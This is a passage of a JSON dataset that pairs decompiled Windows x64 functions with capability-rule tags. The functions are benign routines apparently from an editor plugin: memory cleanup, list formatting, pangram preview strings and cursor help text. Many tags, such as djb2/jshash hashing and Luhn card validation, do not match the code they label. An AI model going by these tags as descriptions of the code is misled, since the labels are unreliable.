        "decompiled_code": "\nvoid fcn.180048fa0(ulong noname_0, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t arg1;\n    int64_t iVar3;\n    uint64_t arg1_00;\n    \n    arg1 = arg2 * 0x60;\n    if (arg2 < 0x2aaaaaaaaaaaaab) {\n        if (arg1 < 0x1000) {\n            if (arg1 == 0) {\n                return;\n            }\n            do {\n                iVar3 = fcn.1800b35a0(arg1);\n                if (iVar3 != 0) {\n                    return;\n                }\n                iVar2 = fcn.1800c086c(arg1);\n            } while (iVar2 != 0);\n            if (arg1 == 0xffffffffffffffff) {\n                fcn.180090898();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18006df20();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    else {\n        arg1 = 0xffffffffffffffff;\n    }\n    arg1_00 = arg1 + 0x27;\n    if (arg1_00 <= arg1) {\n        arg1_00 = 0xffffffffffffffff;\n    }\n    iVar3 = fcn.18008fb2c(arg1_00);\n    if (iVar3 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    *((iVar3 + 0x27U & 0xffffffffffffffe0) - 8) = iVar3;\n    return;\n}\n",
        "token_count": 389
    },
    "18004965": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.180049650(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    int64_t arg2_00;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        arg2_00 = arg2;\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.180048db0(arg1_00 + 0x48, arg2_00);\n                fcn.180042e30(arg1_00);\n                arg1_00 = arg1_00 + 0x60;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0x60) * 0x60;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    *arg1 = arg2;\n    arg1[1] = arg3 * 0x60 + arg2;\n    arg1[2] = arg4 * 0x60 + arg2;\n    return;\n}\n",
        "token_count": 405
    },
    "1800497c": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.1800497c0(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.180048ec0(arg1_00 + 0x48);\n                fcn.180042e30(arg1_00);\n                arg1_00 = arg1_00 + 0x60;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0x60) * 0x60;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    *arg1 = arg2;\n    arg1[1] = arg3 * 0x60 + arg2;\n    arg1[2] = arg4 * 0x60 + arg2;\n    return;\n}\n",
        "token_count": 384
    },
    "18004a78": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18004a780(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    char cVar4;\n    int64_t iVar5;\n    uchar *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uchar auStack152 [32];\n    uchar uStack120;\n    unkbyte7 Stack119;\n    ulong uStack104;\n    uint64_t uStack96;\n    uchar auStack80 [16];\n    uint64_t uStack64;\n    \n    uStack64 = *0x180123080 ^ auStack152;\n    if (arg2 < 0) {\n        arg2._0_4_ = (**0x1800de7f0)(*(arg1 + 0x58), 0x147);\n    }\n    (**0x1800de7f0)(*(arg1 + 0x58), 0x14b);\n    uVar7 = 0;\n    uStack96 = 0xf;\n    uStack104 = 0;\n    puVar6 = &uStack120;\n    uStack120 = 0;\n    fcn.180011120(puVar6, 0x1800f8a58, 0x12);\n    cVar4 = fcn.180007d40(puVar6, &uStack120);\n    iVar9 = (*(arg1 + 0x68))[1] - **(arg1 + 0x68) >> 5;\n    if (0 < iVar9) {\n        do {\n            uVar8 = uVar7 + 1;\n            fcn.180020a90(auStack80, 5, L\"%02d. \", uVar8);\n            iVar5 = **(arg1 + 0x68);\n            if ((*(arg1 + 0x68))[1] - iVar5 >> 5 <= uVar7) {\n                fcn.18003c1b0();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            puVar6 = auStack80;\n            if (cVar4 == '\\0') {\n                puVar6 = 0x1800f78fc;\n            }\n            fcn.18002e7e0(&uStack120, puVar6, uVar7 * 0x20 + iVar5);\n            (**0x1800de7f0)(*(arg1 + 0x58), 0x143, 0);\n            if (7 < uStack96) {\n                iVar3 = CONCAT71(Stack119, uStack120);\n                iVar5 = iVar3;\n                if (0xfff < uStack96 * 2 + 2) {\n                    iVar5 = *(iVar3 + -8);\n                    if (0x1f < (iVar3 - iVar5) - 8U) {\n                        fcn.1800b3528(iVar5, uStack96 * 2 + 0x29);\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(iVar5);\n            }\n            uVar7 = uVar8;\n        } while (uVar8 < iVar9);\n        uVar1 = *(arg1 + 0x58);\n        if (arg2 < 0) {\n            arg2._0_4_ = 0;\n        }\n        (**0x1800de7f0)(uVar1, 0x14e, arg2, 0);\n        (**0x1800de5b8)(uVar1, 0, 0);\n    }\n    fcn.18008fb00(uStack64 ^ auStack152);\n    return;\n}\n",
        "token_count": 830
    },
    "18004b8c": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18004b8c0(int64_t arg1)\n\n{\n    ulong *arg1_00;\n    ulong var_10h_2;\n    ulong var_70h;\n    uchar auStack392 [32];\n    ulong uStack360;\n    ushort auStack344 [8];\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    ushort auStack312 [8];\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    ushort auStack280 [8];\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    ushort auStack248 [8];\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    ushort auStack216 [8];\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    ushort auStack184 [8];\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    ushort auStack152 [8];\n    ulong var_80h;\n    uint uStack128;\n    uint uStack124;\n    ulong var_70h_2;\n    ulong var_bp_60h;\n    uint uStack96;\n    uint uStack92;\n    ulong var_bp_50h;\n    ulong var_bp_40h;\n    uint uStack64;\n    uint uStack60;\n    ulong var_bp_30h;\n    ulong var_bp_20h;\n    uint uStack32;\n    uint uStack28;\n    uint64_t var_10h;\n    \n    uStack360 = 0xfffffffffffffffe;\n    var_10h = *0x180123080 ^ auStack392;\n    uStack328 = *0x180101900;\n    uStack324 = *0x180101904;\n    uStack320 = *0x180101908;\n    uStack316 = *0x18010190c;\n    auStack344[0] = 0;\n    fcn.180010d70(auStack344, 0x1800f9740, 0x26);\n    uStack296 = *0x180101900;\n    uStack292 = *0x180101904;\n    uStack288 = *0x180101908;\n    uStack284 = *0x18010190c;\n    auStack312[0] = 0;\n    fcn.180010d70(auStack312, L\"A QUART JAR OF OIL\\r\\nMIXED WITH ZINC OXIDE\\r\\nMAKES A VERY BRIGHT PAINT.\", 0x45);\n    uStack264 = *0x180101900;\n    uStack260 = *0x180101904;\n    uStack256 = *0x180101908;\n    uStack252 = *0x18010190c;\n    auStack280[0] = 0;\n    fcn.180010d70(auStack280, L\"A WIZARD\\'S JOB IS TO\\r\\nVEX CHUMPS QUICKLY IN FOG.\", 0x30);\n    uStack232 = *0x180101900;\n    uStack228 = *0x180101904;\n    uStack224 = *0x180101908;\n    uStack220 = *0x18010190c;\n    auStack248[0] = 0;\n    fcn.180010d70(auStack248, L\"AMAZINGLY FEW DISCOTHEQUES\\r\\nPROVIDE JUKEBOXES.\", 0x2e);\n    uStack200 = *0x180101900;\n    uStack196 = *0x180101904;\n    uStack192 = *0x180101908;\n    uStack188 = *0x18010190c;\n    auStack216[0] = 0;\n    fcn.180010d70(auStack216, L\"PACK MY BOX WITH\\r\\nFIVE DOZEN LIQUOR JUGS.\", 0x29);\n    uStack168 = *0x180101900;\n    uStack164 = *0x180101904;\n    uStack160 = *0x180101908;\n    uStack156 = *0x18010190c;\n    auStack184[0] = 0;\n    fcn.180010d70(auStack184, L\"THE LAZY MAJOR WAS FIXING\\r\\nCUPID\\'S BROKEN QUIVER.\", 0x31);\n    var_80h._0_4_ = *0x180101900;\n    var_80h._4_4_ = *0x180101904;\n    uStack128 = *0x180101908;\n    uStack124 = *0x18010190c;\n    auStack152[0] = 0;\n    fcn.180010d70(auStack152, L\"MY FAXED JOKE WON A PAGER\\r\\nIN THE CABLE TV QUIZ SHOW.\", 0x35);\n    var_bp_60h._0_4_ = *0x180101900;\n    var_bp_60h._4_4_ = *0x180101904;\n    uStack96 = *0x180101908;\n    uStack92 = *0x18010190c;\n    var_70h_2._0_2_ = 0;\n    fcn.180010d70(&var_70h_2, L\"THE FIVE BOXING WIZARDS\\r\\nJUMP QUICKLY.\", 0x26);\n    var_bp_40h._0_4_ = *0x180101900;\n    var_bp_40h._4_4_ = *0x180101904;\n    uStack64 = *0x180101908;\n    uStack60 = *0x18010190c;\n    var_bp_50h._0_2_ = 0;\n    fcn.180010d70(&var_bp_50h, L\"FEW BLACK TAXIS\\r\\nDRIVE UP MAJOR ROADS\\r\\nON QUIET HAZY NIGHTS.\", 0x3c);\n    var_bp_20h._0_4_ = *0x180101900;\n    var_bp_20h._4_4_ = *0x180101904;\n    uStack32 = *0x180101908;\n    uStack28 = *0x18010190c;\n    var_bp_30h._0_2_ = 0;\n    arg1_00 = &var_bp_30h;\n    fcn.180010d70(arg1_00, L\"WE PROMPTLY JUDGED\\r\\nANTIQUE IVORY BUCKLES\\r\\nFOR THE NEXT PRIZE.\", 0x3e);\n    fcn.1800b62b4(arg1_00);\n    (**0x1800de788)(*(arg1 + 8), 0x271b);\n    fcn.18008ff90(auStack344, 0x20, 10, fcn.180003e40);\n    fcn.18008fb00(var_10h ^ auStack392);\n    return;\n}\n",
        "token_count": 1586
    },
    "18005078": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180050780(int64_t arg1, ulong *arg2)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    char cVar4;\n    int32_t iVar5;\n    ulong arg3;\n    uchar *puVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    ulong *puVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uchar auStack328 [32];\n    ulong *puStack296;\n    int32_t iStack280;\n    uint uStack276;\n    int64_t iStack272;\n    int64_t iStack264;\n    ulong uStack256;\n    uint uStack248;\n    uint uStack244;\n    uint64_t uStack240;\n    uint64_t uStack232;\n    uchar uStack224;\n    unkbyte7 Stack223;\n    ulong uStack208;\n    uint64_t uStack200;\n    ulong uStack192;\n    ulong *puStack184;\n    uchar auStack176 [16];\n    int64_t iStack160;\n    int64_t aiStack152 [2];\n    ulong var_80h;\n    uint64_t var_78h;\n    ulong var_70h;\n    ulong var_68h;\n    int64_t var_60h;\n    ulong var_58h;\n    int64_t var_50h;\n    uint64_t uStack72;\n    ulong var_bp_38h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    uStack192 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack328;\n    uVar11 = 0;\n    iStack280 = 0;\n    auStack176 = ZEXT816(0);\n    iStack160 = 0;\n    puVar6 = &uStack224;\n    arg3 = fcn.18000da90(puVar6, arg2);\n    iVar5 = fcn.1800091e0(puVar6, auStack176, arg3);\n    if (0 < iVar5) {\n        iStack264 = iVar5;\n        uStack276 = 0;\n        iStack272 = 0;\n        uVar12 = uVar11;\n        do {\n            puStack184 = &uStack256;\n            uStack240 = 0;\n            uStack232 = 0;\n            uVar1 = arg2[2];\n            puVar10 = arg2;\n            if (7 < arg2[3]) {\n                puVar10 = *arg2;\n            }\n            if (uVar1 < 8) {\n                uStack256 = *puVar10;\n                uStack248 = *(puVar10 + 1);\n                uStack244 = *(puVar10 + 0xc);\n                uStack232 = 7;\n            }\n            else {\n                uVar8 = uVar1 | 7;\n                if (0x7ffffffffffffffe < uVar8) {\n                    uVar8 = 0x7ffffffffffffffe;\n                }\n                uStack256 = fcn.180011cf0(&uStack256, uVar8 + 1);\n                fcn.1800ade80(uStack256, puVar10, uVar1 * 2 + 2);\n                uStack232 = uVar8;\n            }\n            uStack208 = 0;\n            uStack200 = 0xf;\n            uStack224 = 0;\n            puVar6 = &uStack224;\n            uStack240 = uVar1;\n            fcn.180011120(puVar6, 0x1800f9024, 5);\n            iVar9 = uVar12 * 0x20;\n            puStack296 = &uStack256;\n            iVar5 = fcn.1800056a0(puVar6, auStack176._0_8_ + iVar9, &uStack224, &uStack276);\n            if (0xf < uStack200) {\n                iVar3 = CONCAT71(Stack223, uStack224);\n                iVar7 = iVar3;\n                if ((0xfff < uStack200 + 1) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n                goto code_r0x000180050b5d;\n                fcn.18008fb24(iVar7);\n            }\n            if (0 < iVar5) {\n                iVar7 = arg1;\n                cVar4 = fcn.180051230(arg1, 0);\n                if (cVar4 == '\\0') break;\n                fcn.18004dc10(iVar7, aiStack152);\n                iVar7 = *(arg1 + 0xd0);\n                if (iVar7 == *(arg1 + 0xd8)) {\n                    fcn.180051e80(arg1 + 200, iVar7, aiStack152);\n                }\n                else {\n                    fcn.18004dab0(iVar7, aiStack152);\n                    *(arg1 + 0xd0) = *(arg1 + 0xd0) + 0x48;\n                }\n                fcn.18004d4a0(arg1, (*(arg1 + 0xd0) - *(arg1 + 200)) / 0x48 - 1, auStack176._0_8_ + iVar9, arg2);\n                puVar10 = auStack176._0_8_ + iStack272;\n                if (7 < puVar10[3]) {\n                    puVar10 = *puVar10;\n                }\n                (**0x1800de7f0)(*(arg1 + 0xb8), 0x180, 0, puVar10);\n                iStack280 = iStack280 + 1;\n                if (var_60h != 0) {\n                    iVar9 = var_60h;\n                    if ((0xfff < (var_50h - var_60h & 0xfffffffffffffff0U)) &&\n                       (iVar9 = *(var_60h + -8),  0x1f < (var_60h - iVar9) - 8U)) goto code_r0x000180050b63;\n                    fcn.18008fb24(iVar9);\n                    var_60h = 0;\n                    var_58h = 0;\n                    var_50h = 0;\n                }\n                if (7 < var_78h) {\n                    iVar9 = aiStack152[0];\n                    if ((0xfff < var_78h * 2 + 2) &&\n                       (iVar9 = *(aiStack152[0] + -8),  0x1f < (aiStack152[0] - iVar9) - 8U)) goto code_r0x000180050b63;\n                    fcn.18008fb24(iVar9);\n                }\n            }\n            uVar12 = uVar12 + 1;\n            uVar11 = uVar11 + 1;\n            iStack272 = iStack272 + 0x20;\n        } while (uVar11 < iStack264);\n    }\n    (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, (*(arg1 + 0xd0) - *(arg1 + 200)) / 0x48 + -1, 0);\n    fcn.18004f110(arg1);\n    *(arg1 + 0xb5) = 0;\n    fcn.18004f340(arg1);\n    if (auStack176._0_8_ != 0) {\n        fcn.180013aa0(auStack176._0_8_, auStack176._8_8_);\n        uVar11 = iStack160 - auStack176._0_8_ & 0xffffffffffffffe0;\n        iVar9 = auStack176._0_8_;\n        if (0xfff < uVar11) {\n            iVar9 = *(auStack176._0_8_ + -8);\n            if (0x1f < (auStack176._0_8_ - iVar9) - 8U) {\n                fcn.1800b3528(iVar9, uVar11 + 0x27);\ncode_r0x000180050b5d:\n                fcn.1800b3528();\ncode_r0x000180050b63:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar9);\n    }\n    fcn.18008fb00(uStack72 ^ auStack328);\n    return;\n}\n",
        "token_count": 1966
    },
    "18005e56": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18005e560(ulong ****arg1)\n\n{\n    ulong *puVar1;\n    uint64_t arg1_00;\n    uint32_t uVar2;\n    uint uVar3;\n    ulong **ppuVar4;\n    ulong **ppuVar5;\n    code *pcVar6;\n    int64_t iVar7;\n    uint64_t *puVar8;\n    char cVar9;\n    int32_t iVar10;\n    ulong uVar11;\n    uint32_t *puVar12;\n    ulong ***pppuVar13;\n    ulong ****arg1_01;\n    ulong *arg1_02;\n    int64_t arg1_03;\n    ulong ****ppppuVar14;\n    uint64_t arg1_04;\n    ulong *arg2;\n    uint64_t uVar15;\n    int32_t iVar16;\n    uint64_t uVar17;\n    int64_t iVar18;\n    uint64_t *puVar19;\n    int64_t iVar20;\n    int64_t iVar21;\n    int64_t iVar22;\n    uchar extraout_XMM0 [16];\n    uchar auStack248 [32];\n    uchar uStack216;\n    ulong ****ppppuStack200;\n    uint uStack192;\n    uint uStack188;\n    uint64_t uStack184;\n    uint64_t uStack176;\n    ulong ****ppppuStack168;\n    uint32_t uStack160;\n    uint32_t uStack156;\n    uint32_t uStack152;\n    uint32_t uStack148;\n    ulong uStack144;\n    uint64_t uStack136;\n    ulong uStack128;\n    uchar auStack112 [16];\n    int64_t iStack96;\n    uchar uStack88;\n    unkbyte7 Stack87;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint64_t uStack56;\n    \n    uStack128 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack248;\n    uStack72 = *0x180101910;\n    uStack68 = *0x180101914;\n    uStack64 = *0x180101918;\n    uStack60 = *0x18010191c;\n    uStack88 = 0;\n    ppppuStack168 = arg1;\n    cVar9 = fcn.1800602c0(arg1, &uStack88);\n    puVar8 = CONCAT71(Stack87, uStack88);\n    if (cVar9 == '\\0') goto code_r0x00018005eaf3;\n    iVar10 = *(arg1 + 0x17);\n    pppuVar13 = arg1[0x2c];\n    ppuVar4 = pppuVar13[iVar10 * 0x1d + 0x18];\n    ppuVar5 = pppuVar13[iVar10 * 0x1d + 0x17];\n    auStack112 = ZEXT816(0);\n    iStack96 = 0;\n    iVar16 = pppuVar13[iVar10 * 0x1d + 0x12] - pppuVar13[iVar10 * 0x1d + 0x11] >> 2;\n    iVar21 = iVar16;\n    if (iVar16 != 0) {\n        fcn.180064780(auStack112, iVar21);\n    }\n    iVar16 = 0;\n    if (0 < iVar21) {\n        iVar22 = ppuVar4 - ppuVar5 >> 5;\n        iVar20 = 0;\n        iVar18 = 0;\n        do {\n            if ((iVar22 == 0) || (iVar22 <= iVar20)) {\n                uVar15 = iVar16 + 1;\n                uVar11 = fcn.180020b50(&ppppuStack200, uVar15);\n                puVar12 = fcn.180014b80(uVar11, uVar15, L\"Field #\", 7);\n                uStack160 = *puVar12;\n                uStack156 = puVar12[1];\n                uStack152 = puVar12[2];\n                uStack148 = puVar12[3];\n                uStack144 = *(puVar12 + 4);\n                uStack136 = *(puVar12 + 6);\n                *(puVar12 + 4) = 0;\n                *(puVar12 + 6) = 7;\n                *puVar12 = 0;\n                fcn.18000d960(iVar16 * 0x20 + auStack112._0_8_, &uStack160);\n                if (7 < uStack136) {\n                    iVar7 = CONCAT44(uStack156, uStack160);\n                    arg1_03 = iVar7;\n                    if ((0xfff < uStack136 * 2 + 2) && (arg1_03 = *(iVar7 + -8),  0x1f < (iVar7 - arg1_03) - 8U))\n                    goto code_r0x00018005eb5d;\n                    fcn.18008fb24(arg1_03);\n                }\n                if (7 < uStack176) {\n                    ppppuVar14 = ppppuStack200;\n                    if ((0xfff < uStack176 * 2 + 2) &&\n                       (ppppuVar14 = ppppuStack200[-1],  0x1f < ppppuStack200 + (-8 - ppppuVar14)))\n                    goto code_r0x00018005eb63;\n                    fcn.18008fb24(ppppuVar14);\n                }\n            }\n            else {\n                arg2 = pppuVar13[iVar10 * 0x1d + 0x17] + iVar18;\n                arg1_02 = iVar16 * 0x20 + auStack112._0_8_;\n                if (arg1_02 != arg2) {\n                    puVar1 = arg2 + 2;\n                    if (7 < arg2[3]) {\n                        arg2 = *arg2;\n                    }\n                    fcn.180010d70(arg1_02, arg2, *puVar1);\n                }\n            }\n            iVar16 = iVar16 + 1;\n            iVar20 = iVar20 + 1;\n            iVar18 = iVar18 + 0x20;\n            arg1 = ppppuStack168;\n        } while (iVar20 < iVar21);\n    }\n    uVar11 = *0x18012a388;\n    cVar9 = (**(*0x180124040 + 0x68))(0x180124040);\n    if (cVar9 == '\\0') {\n        *0x180124048 = uVar11;\n        *0x180124050 = *0x18012a390;\n        (**(*0x180124040 + 0x60))(0x180124040, 0x24cc, 0, 1);\n    }\n    arg1_01 = NULL;\n    uStack184 = 0;\n    uStack176 = 0xf;\n    ppppuStack200 = ppppuStack200 & 0xffffffffffffff00;\n    ppppuVar14 = &ppppuStack200;\n    fcn.180011120(ppppuVar14, 0x1800f8538, 0x12);\n    fcn.180007d40(ppppuVar14, &ppppuStack200);\n    (**0x1800de758)(*0x180124058, 0x24d3);\n    *0x1801240a0 = (**0x1800de798)(*0x180124058, 0x24d0);\n    (**0x1800de7f0)(*0x1801240a0, 0x407, 0, 1);\n    (**0x1800de7f0)(*0x1801240a0, 0x408, 0, 10);\n    uStack216 = 1;\n    fcn.180067d90(*0x180124058, 0x24cf, 0, 0x1800f87b0);\n    uStack216 = 1;\n    fcn.180067d90(*0x180124058, 0x24d0, 0, 0x1800f8550);\n    uStack216 = 1;\n    fcn.180067d90(*0x180124058, 0x24d1, 0, \n                  L\"When the cursor is set at its default width of \\'1\\', it can be hard to spot the cursor at its new position. To aid quick spotting, the cursor is briefly set to block mode at the destination position.\\r\\n\\r\\nSpecify the number of seconds to have the cursor flashing in block mode at the destination position.\"\n                 );\n    fcn.180066d20(0x180124040);\n    (**0x1800de7f0)(*0x180124050, 0x806, 0, *0x180124058);\n    uVar2 = *(arg1 + 0x18);\n    uVar3 = *(arg1 + 0x17);\n    uStack184 = 0;\n    uStack176 = 0;\n    puVar19 = &uStack88;\n    if (0xf < CONCAT44(uStack60, uStack64)) {\n        puVar19 = puVar8;\n    }\n    uVar15 = CONCAT44(uStack68, uStack72);\n    if (0xf < uVar15) {\n        uVar17 = uVar15 | 0xf;\n        if (0x7fffffffffffffff < uVar17) {\n            uVar17 = 0x7fffffffffffffff;\n        }\n        arg1_00 = uVar17 + 1;\n        if (arg1_00 < 0x1000) {\n            if (arg1_00 != 0) {\n                arg1_01 = fcn.18008fb2c(arg1_00);\n            }\ncode_r0x00018005e96e:\n            ppppuStack200 = arg1_01;\n            fcn.1800ade80(arg1_01, puVar19, uVar15 + 1);\n            goto code_r0x00018005e981;\n        }\n        arg1_04 = uVar17 + 0x28;\n        if (arg1_04 <= arg1_00) {\n            arg1_04 = 0xffffffffffffffff;\n        }\n        pppuVar13 = fcn.18008fb2c(arg1_04);\n        if (pppuVar13 != NULL) {\n            arg1_01 = pppuVar13 + 0x27U & 0xffffffffffffffe0;\n            arg1_01[-1] = pppuVar13;\n            goto code_r0x00018005e96e;\n        }\ncode_r0x00018005eb69:\n        fcn.1800b3528();\ncode_r0x00018005eb6f:\n        fcn.1800b3528();\n        pcVar6 = swi(3);\n        (*pcVar6)();\n        return;\n    }\n    ppppuStack200 = *puVar19;\n    uStack192 = *(puVar19 + 1);\n    uStack188 = *(puVar19 + 0xc);\n    uVar17 = 0xf;\ncode_r0x00018005e981:\n    ppppuStack168 = &ppppuStack200;\n    ppppuVar14 = &ppppuStack200;\n    if (0xf < uVar17) {\n        ppppuVar14 = ppppuStack200;\n    }\n    uStack184 = uVar15;\n    uStack176 = uVar17;\n    fcn.180011120(0x180124070, ppppuVar14, uVar15);\n    *0x1801240a8 = auStack112;\n    *0x180124090 = uVar3;\n    *0x180124098 = (**0x1800de798)(*0x180124058);\n    fcn.18004a780(0x180124040, uVar2);\n    uStack144 = 0;\n    uStack136 = 0xf;\n    uStack160 = uStack160 & 0xffffff00;\n    puVar12 = &uStack160;\n    fcn.180011120(puVar12, 0x1800f8a10, 0x11);\n    iVar10 = fcn.180008250(puVar12, &uStack160, 5);\n    (**0x1800de7f0)(*0x1801240a0, 0x405, 1, iVar10);\n    (**0x1800de6d8)(*0x180124058, 0x24d1, iVar10, 0);\n    (**0x1800de6f0)(*0x180124098);\n    if (0xf < uStack176) {\n        ppppuVar14 = ppppuStack200;\n        if ((0xfff < uStack176 + 1) && (ppppuVar14 = ppppuStack200[-1],  0x1f < ppppuStack200 + (-8 - ppppuVar14)))\n        goto code_r0x00018005eb69;\n        fcn.18008fb24(ppppuVar14);\n    }\n    if (auStack112._0_8_ != 0) {\n        fcn.180013aa0(auStack112._0_8_, auStack112._8_8_);\n        iVar21 = auStack112._0_8_;\n        if ((0xfff < (iStack96 - auStack112._0_8_ & 0xffffffffffffffe0U)) &&\n           (iVar21 = *(auStack112._0_8_ + -8),  0x1f < (auStack112._0_8_ - iVar21) - 8U)) goto code_r0x00018005eb6f;\n        fcn.18008fb24(iVar21);\n        auStack112 = extraout_XMM0 & 0x0;\n        iStack96 = 0;\n    }\ncode_r0x00018005eaf3:\n    if (0xf < CONCAT44(uStack60, uStack64)) {\n        puVar19 = puVar8;\n        if ((0xfff < CONCAT44(uStack60, uStack64) + 1) && (puVar19 = puVar8[-1],  0x1f < puVar8 + (-8 - puVar19))) {\n            fcn.1800b3528();\ncode_r0x00018005eb5d:\n            fcn.1800b3528();\ncode_r0x00018005eb63:\n            fcn.1800b3528();\n            pcVar6 = swi(3);\n            (*pcVar6)();\n            return;\n        }\n        fcn.18008fb24(puVar19);\n    }\n    fcn.18008fb00(uStack56 ^ auStack248);\n    return;\n}\n",
        "token_count": 3299
    },
    "180062f3": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.180062f30(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.180048db0(arg1_00 + 0x48, arg2);\n                fcn.180042e30(arg1_00);\n                arg1_00 = arg1_00 + 0x60;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        uVar2 = ((arg1[2] - arg1_00) / 0x60) * 0x60;\n        iVar3 = arg1_00;\n        if (0xfff < uVar2) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(arg1[2] - arg1_00, uVar2 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "18006610": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
